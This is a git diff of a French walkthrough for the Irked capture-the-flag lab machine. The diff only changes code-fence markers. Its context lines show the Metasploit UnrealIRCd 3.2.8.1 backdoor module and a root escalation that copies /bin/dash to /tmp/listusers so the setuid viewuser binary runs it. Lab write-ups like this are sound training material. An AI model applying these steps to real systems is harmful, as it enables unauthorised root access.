@@ -12,7 +12,7 @@ Platforme Linux et difficulté facile (20 points), c'est parti !
 
 La machine dispose de ports ouverts classiques mais aussi certains en rapport avec IRC :  
 
-```plain
+```
 Nmap scan report for 10.10.10.117
 Host is up (0.029s latency).
 Not shown: 65513 closed ports
@@ -43,7 +43,7 @@ PORT      STATE    SERVICE
 
 Le serveur web ne retournant rien d'intéressant c'est le moment de lancer le client IRC XChat pour voir ce que l'on trouve :  
 
-```plain
+```
 * *** Looking up your hostname...
 * *** Couldn't resolve your hostname; using your IP address instead
 * You have not registered
@@ -68,7 +68,7 @@ On voit ici que le serveur IRCd est un Unread en version 3.2.8.1, bien connu pou
 
 *Metasploit* dispose d'un module pour cette vulnérabilité, il suffit juste de tester quelques payloads pour en trouver un fonctionnel :  
 
-```plain
+```
 msf exploit(unix/irc/unreal_ircd_3281_backdoor) > show options
 
 Module options (exploit/unix/irc/unreal_ircd_3281_backdoor):
@@ -107,7 +107,7 @@ Le système est un Debian 32 bits (*Linux irked 3.16.0-6-686-pae #1 SMP Debian 3
 
 Il y a un utilisateur qui possède le flag *user.txt* :  
 
-```plain
+```
 1061877    4 drwxr-xr-x  18 djmardov djmardov     4096 Nov  3 04:40 /home/djmardov
 1177472    4 drwx------   3 djmardov djmardov     4096 May 11  2018 /home/djmardov/.dbus
 1061885    4 -rw-r--r--   1 djmardov djmardov      675 May 11  2018 /home/djmardov/.profile
@@ -158,7 +158,7 @@ Malheureusement ce qui semble être un mot de passe ne semble pas permettre un a
 
 Le binaire *viewuser* semble être le chemin tout tracé :  
 
-```plain
+```
 -rwsr-xr-x 1 root root 7328 May 16  2018 /usr/bin/viewuser
 ```
 
@@ -168,7 +168,7 @@ Une fois ce binaire récupéré on l'ouvre dans *Cutter* pour voir le *main()* :
 
 Et parmi les chaînes de caractères présentes dans le programme on voit */tmp/listusers* qui n'existe pas...  
 
-```plain
+```
 ircd@irked:/var/www/html$ cp /bin/dash /tmp/listusers
 ircd@irked:/var/www/html$ viewuser
 This application is being devleoped to set and test user permissions
